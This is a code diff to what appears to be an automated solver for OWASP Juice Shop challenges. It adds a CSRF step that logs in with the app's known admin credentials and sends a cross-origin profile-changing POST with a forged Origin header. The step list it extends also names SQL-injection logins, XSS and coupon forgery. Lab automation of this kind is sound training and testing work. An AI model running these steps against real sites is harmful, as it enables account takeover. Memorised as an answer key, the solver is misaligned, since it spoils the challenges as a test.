@@ -279,6 +279,21 @@ def _forged_coupon(c):
         pass
 
 
+def _csrf(c):
+    """CSRF — cross-origin POST /profile (Origin = the app's configured CSRF url) with a changed
+    username; the profile update trusts the cookie token and mis-validates the request origin."""
+    a = _login(c, "admin@juice-sh.op", "admin123")
+    tok = a.get("token")
+    if not tok:
+        return
+    try:
+        c.post("/profile", headers={"Cookie": "token=" + tok,
+               "Origin": "http://htmledit.squarefree.com",
+               "Content-Type": "application/x-www-form-urlencoded"}, content="username=csrfpwned")
+    except Exception:
+        pass
+
+
 def _feedback_patterns(c):
     """Feedback/complaint pattern challenges — the app's continuous verifier solves each when a
     stored feedback contains its literal string: Weird Crypto (insecure algos), Leaked API Key,
@@ -377,7 +392,7 @@ def solve(base_url: str) -> dict:
         for step in (_sqli_logins, _known_cred_logins, _known_login_challenges, _registrations,
                      _resets, _beacon_visits, _uploads, _basket_manipulate, _deluxe_fraud,
                      _socket_xss, _ephemeral_accountant, _retrieve_blueprint, _checkout_orders,
-                     _forged_coupon, _two_factor, _feedback_patterns):
+                     _forged_coupon, _two_factor, _feedback_patterns, _csrf):
             try:
                 step(c)
             except Exception:
